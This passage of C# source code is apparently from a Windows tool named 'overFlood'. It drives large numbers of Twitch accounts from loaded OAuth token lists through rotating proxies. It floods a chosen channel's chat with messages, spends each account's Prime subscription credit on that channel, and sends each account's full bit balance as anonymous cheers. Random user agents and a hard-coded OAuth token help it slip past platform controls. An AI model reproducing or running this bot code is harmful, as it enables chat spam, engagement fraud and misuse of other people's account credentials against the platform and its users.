            chkChatUseProxies.Enabled = false;
            btnChatStart.Enabled = false;
            btnChatStop.Enabled = true;
            messagesSuccess = 0;
            messagesFail = 0;
            lblSuccess.Text = "Success: 0";
            lblMessagesFail.Text = "Fail: 0";

            t = (int)Math.Ceiling(chatTokens.Count() / Convert.ToDouble(txtChatBots.Text));

            ThreadPool.SetMinThreads(Convert.ToInt32(txtChatBots.Text), Convert.ToInt32(txtChatBots.Text));

            chatTokenSource = new CancellationTokenSource();
            CancellationToken cancellationToken = chatTokenSource.Token;

            ParallelOptions parallelOptions = new ParallelOptions
            {
                MaxDegreeOfParallelism = Convert.ToInt32(txtChatBots.Text),
                CancellationToken = cancellationToken
            };

            try
            {
                await Task.Run(() => Parallel.For(0, Convert.ToInt32(txtChatBots.Text), parallelOptions, ChatBot), cancellationToken);
            }
            catch (OperationCanceledException)
            {
                // ignored
            }

            comboChatProxyType.Enabled = true;
            txtChatTimeout.Enabled = true;
            btnLoadMessages.Enabled = true;
            btnChatLoadProxies.Enabled = true;
            btnChatLoadTokens.Enabled = true;
            txtChatDelay.Enabled = true;
            txtChatChannel.Enabled = true;
            txtChatBots.Enabled = true;
            chkChatUseProxies.Enabled = true;
            btnChatStart.Enabled = true;
            btnChatStop.Enabled = false;
            MessageBox.Show($"Sent {messagesSuccess} messages.", "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private async void ChatBot(int bots)
        {
            if (chatTokenSource.IsCancellationRequested)
            {
                return;
            }

            int num = t * bots;
            int num2 = Math.Min(chatTokens.Count() - num, t);

            if (num2 >= 1)
            {
                List<string> range = chatTokens.ToList().GetRange(num, num2);

                while (true)
                {
                    Random random = new Random();
                    string str = range[random.Next(range.Count)];
                    if (str.Contains(":"))
                        str = str.Contains("oauth:") ? str.Split(':')[1] : str.Split(':')[0];
                    string str2 = messages[random.Next(messages.Count())];

                    if (chkChatUseProxies.Checked)
                    {
                        try
                        {
                            ProxyType proxyType;

                            switch (comboChatProxyType.Text)
                            {
                                case "HTTP":
                                    proxyType = ProxyType.HTTP;
                                    break;
                                case "SOCKS4":
                                    proxyType = ProxyType.Socks4;
                                    break;
                                case "SOCKS4a":
                                    proxyType = ProxyType.Socks4A;
                                    break;
                                case "SOCKS5":
                                    proxyType = ProxyType.Socks5;
                                    break;
                                default:
                                    proxyType = ProxyType.HTTP;
                                    break;
                            }

                            int index = new Random().Next(chatProxies.Count());
                            ProxyClient proxyClient = ProxyClient.Parse(proxyType, chatProxies[index]);
                            proxyClient.ReadWriteTimeout = Convert.ToInt32(txtChatTimeout.Text);
                            proxyClient.ConnectTimeout = Convert.ToInt32(txtChatTimeout.Text);

                            using (TcpClient tcpClient = proxyClient.CreateConnection("irc.chat.twitch.tv", 6667))
                            {
                                using (StreamWriter streamWriter = new StreamWriter(tcpClient.GetStream()))
                                {
                                    streamWriter.AutoFlush = true;

                                    if (tcpClient.Connected)
                                    {
                                        await streamWriter.WriteLineAsync($"PASS oauth:{str}");
                                        await streamWriter.WriteLineAsync("NICK importaeh");
                                        await streamWriter.WriteLineAsync($"JOIN #{txtChatChannel.Text}");
                                        await streamWriter.WriteLineAsync($"PRIVMSG #{txtChatChannel.Text} :{str2}");

                                        Interlocked.Increment(ref messagesSuccess);
                                        lblSuccess.Text = $"Success: {messagesSuccess}";

                                        if (chatTokenSource.IsCancellationRequested)
                                        {
                                            break;
                                        }
                                    }
                                }
                            }
                        }
                        catch (Exception)
                        {
                            Interlocked.Increment(ref messagesFail);
                            lblMessagesFail.Text = $"Fail: {messagesFail}";
                        }

                        Thread.Sleep(Convert.ToInt32(txtChatDelay.Text));
                    }
                    else
                    {
                        using (ClientWebSocket clientWebSocket = new ClientWebSocket())
                        {
                            try
                            {
                                clientWebSocket.ConnectAsync(new Uri("wss://irc-ws.chat.twitch.tv"), CancellationToken.None).Wait();

                                clientWebSocket.SendAsync(new ArraySegment<byte>(Encoding.UTF8.GetBytes("CAP REQ :twitch.tv/tags twitch.tv/commands")), WebSocketMessageType.Text, true, CancellationToken.None).Wait();
                                clientWebSocket.SendAsync(new ArraySegment<byte>(Encoding.UTF8.GetBytes("PASS oauth:" + str)), WebSocketMessageType.Text, true, CancellationToken.None).Wait();
                                clientWebSocket.SendAsync(new ArraySegment<byte>(Encoding.UTF8.GetBytes("NICK importaeh")), WebSocketMessageType.Text, true, CancellationToken.None).Wait();
                                clientWebSocket.SendAsync(new ArraySegment<byte>(Encoding.UTF8.GetBytes("JOIN " + txtChatChannel.Text)), WebSocketMessageType.Text, true, CancellationToken.None).Wait();
                                clientWebSocket.SendAsync(new ArraySegment<byte>(Encoding.UTF8.GetBytes("PRIVMSG #" + txtChatChannel.Text + " :" + str2)), WebSocketMessageType.Text, true, CancellationToken.None).Wait();

                                Interlocked.Increment(ref messagesSuccess);
                                lblSuccess.Text = $"Success: {messagesSuccess}";

                                if (chatTokenSource.IsCancellationRequested)
                                {
                                    break;
                                }
                            }
                            catch (Exception)
                            {
                                Interlocked.Increment(ref messagesFail);
                                lblMessagesFail.Text = $"Fail: {messagesFail}";
                            }
                        }
                        
                        Thread.Sleep(Convert.ToInt32(txtChatDelay.Text));
                    }
                }
            }
        }

        private void btnChatStop_Click(object sender, EventArgs e)
        {
            chatTokenSource.Cancel();
        }
        #endregion

        #region Sub Bot Methods
        private void chkSubUseProxies_CheckedChanged(object sender, EventArgs e)
        {
            txtSubTimeout.Enabled = chkSubUseProxies.Checked;
            btnSubLoadProxies.Enabled = chkSubUseProxies.Checked;
        }

        private void btnSubLoadProxies_Click(object sender, EventArgs e)
        {
            try
            {
                string fileName = Utilities.OpenFileDialog("Load Proxies");
                if (string.IsNullOrEmpty(fileName)) return;
                subProxies = Utilities.LoadFile(fileName);
                lblSubProxies.Text = $"Proxies: {subProxies.Count()}";
                MessageBox.Show($"Loaded {subProxies.Count()} proxies.", "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void btnSubLoadTokens_Click(object sender, EventArgs e)
        {
            try
            {
                string fileName = Utilities.OpenFileDialog("Load Tokens");
                if (string.IsNullOrEmpty(fileName)) return;
                subTokens = Utilities.LoadFile(fileName);
                lblSubTokens.Text = $"Tokens: {subTokens.Count()}";
                MessageBox.Show($"Loaded {subTokens.Count()} tokens.", "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private async void btnSubStart_Click(object sender, EventArgs e)
        {
            if (chkSubUseProxies.Checked && (subProxies == null || !subProxies.Any()))
            {
                MessageBox.Show("Upload proxies list.", "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                return;
            }

            if (subTokens == null || !subTokens.Any())
            {
                MessageBox.Show("Upload tokens list.", "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                return;
            }

            subChannelId = GetChannel(txtSubChannel.Text);
            
            if (string.IsNullOrEmpty(subChannelId))
            {
                MessageBox.Show("The streamer doesn't exist or an error occured.", "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                return;
            }

            txtSubChannel.Enabled = false;
            txtSubBots.Enabled = false;
            txtSubDelay.Enabled = false;
            btnSubLoadTokens.Enabled = false;
            comboSubProxyType.Enabled = false;
            btnSubLoadProxies.Enabled = false;
            txtSubTimeout.Enabled = false;
            btnSubStart.Enabled = false;
            btnSubStop.Enabled = true;
            lblSubSuccess.Text = "Success: 0";
            lblSubFail.Text = "Fail: 0";
            success = 0;
            fail = 0;

            ThreadPool.SetMinThreads(Convert.ToInt32(txtSubBots.Text), Convert.ToInt32(txtSubBots.Text));

            subTokenSource = new CancellationTokenSource();
            CancellationToken cancellationToken = subTokenSource.Token;

            ParallelOptions parallelOptions = new ParallelOptions
            {
                MaxDegreeOfParallelism = Convert.ToInt32(txtSubBots.Text),
                CancellationToken = cancellationToken
            };

            try
            {
                await Task.Run(() => Parallel.ForEach(subTokens, parallelOptions, SubBot), cancellationToken);
            }
            catch (OperationCanceledException)
            {
                // ignored
            }

            btnSubLoadTokens.Enabled = true;
            comboSubProxyType.Enabled = true;
            btnSubLoadProxies.Enabled = true;
            txtSubTimeout.Enabled = true;
            txtSubChannel.Enabled = true;
            txtSubBots.Enabled = true;
            txtSubDelay.Enabled = true;
            btnSubStart.Enabled = true;
            btnSubStop.Enabled = false;
            MessageBox.Show($"Sent {success} subscribers to {txtSubChannel.Text}.", "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private string CheckToken1(string token)
        {
            string result;
            using (HttpRequest httpRequest = new HttpRequest())
            {
                httpRequest.IgnoreProtocolErrors = true;
                httpRequest.KeepAlive = true;
                httpRequest.AddHeader("Authorization", "OAuth " + token);
                httpRequest.AddHeader("Client-Id", "kimne78kx3ncx6brgo4mv6wki5h1ko");
                try
                {
                    string input = httpRequest.Post("https://gql.twitch.tv/gql", "[{\"operationName\":\"BitsCard_Bits\",\"variables\":{},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"fe1052e19ce99f10b5bd9ab63c5de15405ce87a1644527498f0fc1aadeff89f2\"}}},{\"operationName\":\"BitsCard_MainCard\",\"variables\":{\"name\":\"214062798\",\"withCheerBombEventEnabled\":false},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"88cb043070400a165104f9ce491f02f26c0b571a23b1abc03ef54025f6437848\"}}}]", "text/plain;charset=UTF-8").ToString();
                    result = new Regex("id\":\"(.*?)\"").Match(input).Groups[1].Value;
                }
                catch (Exception)
                {
                    result = "request error";
                }
            }
            return result;
        }

        private void SubBot(string token)
        {
            if (subTokenSource.IsCancellationRequested)
            {
                return;
            }

            try
            {
                if (token.Contains(":"))
                    token = token.Contains("oauth:") ? token.Split(':')[1] : token.Split(':')[0];
                string userId = CheckToken1(token);
                if (string.IsNullOrEmpty(userId))
                {
                    Interlocked.Increment(ref fail);
                    lblSubFail.Text = $"Fail: {fail}";
                    return;
                };
                string response;
                while ((response = SubChannel(token, subChannelId, userId)) == "request error")
                {
                }
                if (!response.Contains("error\":null,"))
                {
                    Interlocked.Increment(ref fail);
                    lblSubFail.Text = $"Fail: {fail}";
                }
                else
                {
                    Interlocked.Increment(ref success);
                    lblSubSuccess.Text = $"Success: {success}";
                }
            }
            catch (Exception)
            {
                Interlocked.Increment(ref fail);
                lblSubFail.Text = $"Fail: {fail}";
            }
            
            Thread.Sleep(Convert.ToInt32(txtSubDelay.Text));
        }

        private string SubChannel(string token, string channelId, string userId)
        {
            string result;
            using (HttpRequest httpRequest = new HttpRequest())
            {
                try
                {
                    if (chkSubUseProxies.Checked)
                    {
                        ProxyType proxyType;

                        switch (comboSubProxyType.Text)
                        {
                            case "HTTP":
                                proxyType = ProxyType.HTTP;
                                break;
                            case "SOCKS4":
                                proxyType = ProxyType.Socks4;
                                break;
                            case "SOCKS4a":
                                proxyType = ProxyType.Socks4A;
                                break;
                            case "SOCKS5":
                                proxyType = ProxyType.Socks5;
                                break;
                            default:
                                proxyType = ProxyType.HTTP;
                                break;
                        }

                        int index = new Random().Next(subProxies.Count());
                        ProxyClient proxyClient = ProxyClient.Parse(proxyType, subProxies[index]);
                        proxyClient.ReadWriteTimeout = Convert.ToInt32(txtSubTimeout.Text);
                        proxyClient.ConnectTimeout = Convert.ToInt32(txtSubTimeout.Text);
                        httpRequest.Proxy = proxyClient;
                    }

                    httpRequest.UserAgent = Http.RandomUserAgent();
                    httpRequest.Referer = "https://www.twitch.tv/" + txtSubChannel.Text.ToLower();
                    httpRequest.IgnoreProtocolErrors = true;
                    httpRequest.Reconnect = false;
                    httpRequest.Authorization = "OAuth " + token;
                    httpRequest.AddHeader("Pragma", "no-cache");
                    httpRequest.AddHeader("Origin", "https://twitch.tv");
                    httpRequest.AddHeader("Client-Id", "kimne78kx3ncx6brgo4mv6wki5h1ko");
                    string str = string.Concat("{\"operationName\":\"PrimeSubscribe_SpendPrimeSubscriptionCredit\",\"variables\":{\"input\":{\"broadcasterID\":\"", channelId, "\",\"userID\":\"", userId, "\"}},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"639d5286f985631f9ff66c5bd622d839f73113bae9ed44ec371aa9110563254c\"}}}");

                    result = httpRequest.Post("https://gql.twitch.tv/gql", str, "text/plain;charset=UTF-8").ToString();
                }
                catch (Exception)
                {
                    result = "request error";
                }
            }
            return result;
        }

        private void btnSubStop_Click(object sender, EventArgs e)
        {
            subTokenSource.Cancel();
        }
        #endregion

        #region Bit Sender Methods
        private void chkBitUseProxies_CheckedChanged(object sender, EventArgs e)
        {
            txtBitTimeout.Enabled = chkBitUseProxies.Checked;
            btnBitLoadProxies.Enabled = chkBitUseProxies.Checked;
        }

        private void btnBitLoadProxies_Click(object sender, EventArgs e)
        {
            try
            {
                string fileName = Utilities.OpenFileDialog("Load Proxies");
                if (string.IsNullOrEmpty(fileName)) return;
                bitProxies = Utilities.LoadFile(fileName);
                lblBitProxies.Text = $"Proxies: {bitProxies.Count()}";
                MessageBox.Show($"Loaded {bitProxies.Count()} proxies.", "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void btnBitLoadTokens_Click(object sender, EventArgs e)
        {
            try
            {
                string fileName = Utilities.OpenFileDialog("Load Tokens");
                if (string.IsNullOrEmpty(fileName)) return;
                bitTokens = Utilities.LoadFile(fileName);
                lblBitTokens.Text = $"Tokens: {bitTokens.Count()}";
                MessageBox.Show($"Loaded {bitTokens.Count()} tokens.", "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private async void btnBitStart_Click(object sender, EventArgs e)
        {
            if (chkBitUseProxies.Checked && (bitProxies == null || !bitProxies.Any()))
            {
                MessageBox.Show("Upload proxies list.", "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                return;
            }

            if (bitTokens == null || !bitTokens.Any())
            {
                MessageBox.Show("Upload tokens list.", "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                return;
            }

            bitChannelId = GetChannel(txtBitChannel.Text);

            if (string.IsNullOrEmpty(bitChannelId))
            {
                MessageBox.Show("The streamer doesn't exist or an error occured.", "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                return;
            }

            txtBitChannel.Enabled = false;
            txtBitBots.Enabled = false;
            txtBitDelay.Enabled = false;
            btnBitLoadTokens.Enabled = false;
            comboBitProxyType.Enabled = false;
            btnBitLoadProxies.Enabled = false;
            txtBitTimeout.Enabled = false;
            btnBitStart.Enabled = false;
            btnBitStop.Enabled = true;
            bitSuccess = 0;
            bitFail = 0;
            lblBitSuccess.Text = "Success: 0";
            lblBitFail.Text = "Fail: 0";

            ThreadPool.SetMinThreads(Convert.ToInt32(txtBitBots.Text), Convert.ToInt32(txtBitBots.Text));

            bitTokenSource = new CancellationTokenSource();
            CancellationToken cancellationToken = bitTokenSource.Token;

            ParallelOptions parallelOptions = new ParallelOptions
            {
                MaxDegreeOfParallelism = Convert.ToInt32(txtBitBots.Text),
                CancellationToken = cancellationToken
            };

            try
            {
                await Task.Run(() => Parallel.ForEach(bitTokens, parallelOptions, DoBitWork), cancellationToken);
            }
            catch (OperationCanceledException)
            {
                // ignored
            }

            txtBitChannel.Enabled = true;
            txtBitBots.Enabled = true;
            txtBitDelay.Enabled = true;
            btnBitLoadTokens.Enabled = true;
            comboBitProxyType.Enabled = true;
            btnBitLoadProxies.Enabled = true;
            txtBitTimeout.Enabled = true;
            btnBitStart.Enabled = true;
            btnBitStop.Enabled = false;
            MessageBox.Show($"Sent bits on {bitSuccess} accounts.", "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void btnBitStop_Click(object sender, EventArgs e)
        {
            bitTokenSource.Cancel();
        }

        private void DoBitWork(string token)
        {
            if (bitTokenSource.IsCancellationRequested)
            {
                bitTokenSource.Cancel();
            }

            try
            {
                if (token.Contains(":"))
                    token = token.Contains("oauth:") ? token.Split(':')[1] : token.Split(':')[0];

                int bitBalance = GetBitBalance(token, bitChannelId);

                if (bitBalance > 0 && !SendBits(token, bitChannelId, bitBalance).Contains("server error"))
                {
                    Interlocked.Increment(ref bitSuccess);
                    lblBitSuccess.Text = $"Success: {bitSuccess}";
                }
                else
                {
                    Interlocked.Increment(ref bitFail);
                    lblBitFail.Text = $"Fail: {bitFail}";
                }
            }
            catch (Exception)
            {
                Interlocked.Increment(ref bitFail);
                lblBitFail.Text = $"Fail: {bitFail}";
            }

            Thread.Sleep(Convert.ToInt32(txtBitDelay.Text));
        }

        private string SendBits(string token, string channelId, int bitBalance)
        {
            string result;
            using (HttpRequest httpRequest = new HttpRequest())
            {
                try
                {
                    if (chkBitUseProxies.Checked)
                    {
                        ProxyType proxyType;

                        switch (comboBitProxyType.Text)
                        {
                            case "HTTP":
                                proxyType = ProxyType.HTTP;
                                break;
                            case "SOCKS4":
                                proxyType = ProxyType.Socks4;
                                break;
                            case "SOCKS4a":
                                proxyType = ProxyType.Socks4A;
                                break;
                            case "SOCKS5":
                                proxyType = ProxyType.Socks5;
                                break;
                            default:
                                proxyType = ProxyType.HTTP;
                                break;
                        }

                        int index = new Random().Next(bitProxies.Count());
                        ProxyClient proxyClient = ProxyClient.Parse(proxyType, bitProxies[index]);
                        proxyClient.ReadWriteTimeout = Convert.ToInt32(txtBitTimeout.Text);
                        proxyClient.ConnectTimeout = Convert.ToInt32(txtBitTimeout.Text);
                        httpRequest.Proxy = proxyClient;
                    }

                    httpRequest.UserAgent = Http.RandomUserAgent();
                    httpRequest.Referer = "https://www.twitch.tv/";
                    httpRequest.IgnoreProtocolErrors = true;
                    httpRequest.Reconnect = false;
                    httpRequest.Authorization = string.Format("OAuth {0}", token);
                    httpRequest.AddHeader("Pragma", "no-cache");
                    httpRequest.AddHeader("Origin", "https://twitch.tv");
                    httpRequest.AddHeader("Client-Id", "kimne78kx3ncx6brgo4mv6wki5h1ko");
                    object[] array = new object[10];
                    array[0] = "[{\"operationName\":\"ChatInput_SendCheer\",\"variables\":{\"input\":{\"id\":\"";
                    object[] array2 = array;
                    array[1] = Math.Floor((DateTime.Now.ToUniversalTime() - new DateTime(1970, 1, 1, 0, 0, 0, 0, DateTimeKind.Utc)).TotalSeconds);
                    object[] array3 = array2;
                    array2[2] = GenerateString();
                    array3[3] = "\",\"targetID\":\"";
                    array3[4] = channelId;
                    array3[5] = "\",\"bits\":";
                    array3[6] = bitBalance;
                    array3[7] = ",\"content\":\"Anon";
                    array3[8] = bitBalance;
                    array3[9] = "\",\"isAutoModEnabled\":true,\"shouldCheerAnyway\":false,\"isAnonymous\":true}},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"57b0d6bd979e516ae3767f6586e7f23666d612d3a65af1d5436dba130c9426fd\"}}}]";
                    string str = string.Concat(array3);

                    result = httpRequest.Post("https://gql.twitch.tv/gql", str, "text/plain;charset=UTF-8").ToString();
                }
                catch (Exception)
                {
                    result = "";
                }
            }
            return result;
        }

        private int GetBitBalance(string token, string channelId)
        {
            int result;
            using (HttpRequest httpRequest = new HttpRequest())
            {
                httpRequest.UserAgent = Http.RandomUserAgent();
                httpRequest.Referer = "https://www.twitch.tv/";
                httpRequest.IgnoreProtocolErrors = true;
                httpRequest.Reconnect = false;
                httpRequest.Authorization = string.Format("OAuth {0}", token);
                httpRequest.AddHeader("Pragma", "no-cache");
                httpRequest.AddHeader("Origin", "https://twitch.tv");
                httpRequest.AddHeader("Client-Id", "kimne78kx3ncx6brgo4mv6wki5h1ko");
                string str = "{\"operationName\":\"BitsBalanceInChannelQuery\",\"variables\":{\"channelId\":\"" + channelId + "\"},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"7560b93b8ed75a96c7ff1cbe100cf9dba847a4b84c3462e983262c884c137e3d\"}},\"query\":\"query BitsBalanceInChannelQuery($channelId: ID!) {  currentUser {    __typename    bitsBalance  }  user(id: $channelId) {    __typename    self {      __typename      bitsBadge {        __typename        current {          __typename          imageURL(size: QUADRUPLE)        }        next {          __typename          imageURL(size: QUADRUPLE)        }        nextBits        progress        totalBits      }    }  }}\"}";
                try
                {
                    int.TryParse(Regex.Match(httpRequest.Post("https://gql.twitch.tv/gql", str, "text/plain;charset=UTF-8").ToString(), "bitsBalance\":(.*?)},").Groups[1].Value, out int num);
                    result = num;
                }
                catch (Exception)
                {
                    result = 0;
                }
            }
            return result;
        }

        private string GenerateString()
        {
            string text = "";
            string text2 = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890-";
            int num = new Random().Next(15, 40);
            int num2 =  0;
            while (num2 < num)
            {
                text += text2[new Random().Next(text2.Length)].ToString();
                num2 += 1;
            }
            return text;
        }
        #endregion

        private string GetChannel(string channel)
        {
            string result;
            using (HttpRequest httpRequest = new HttpRequest())
            {
                httpRequest.UserAgent = Http.RandomUserAgent();
                httpRequest.IgnoreProtocolErrors = true;
                httpRequest.Reconnect = false;
                for (; ; )
                {
                    try
                    {
                        result = Regex.Match(httpRequest.Get(string.Concat(new string[]
                        {
                        "https://api.twitch.tv/api/channels/",
                        channel,
                        "/access_token?need_https=true&oauth_token=xkv96u0yoyz7vrzh55lxmboon3mgvt",
                        "&platform=web&player_backend=mediaplayer&player_type=site"
                        }), null).ToString(), "channel_id\\\\\":(.*?),\\\\\"chansub").Groups[1].Value;
                        break;
                    }
                    catch (Exception)
                    {
                        result = "";
                    }
                }
            }

            return result;
        }

        public static void WriteLine(StreamWriter streamWriter, string line)
        {
            lock (streamWriter)
            {
                streamWriter.WriteLine(line);
            }
        }

        private void MainForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            Environment.Exit(0);
        }
    }
}
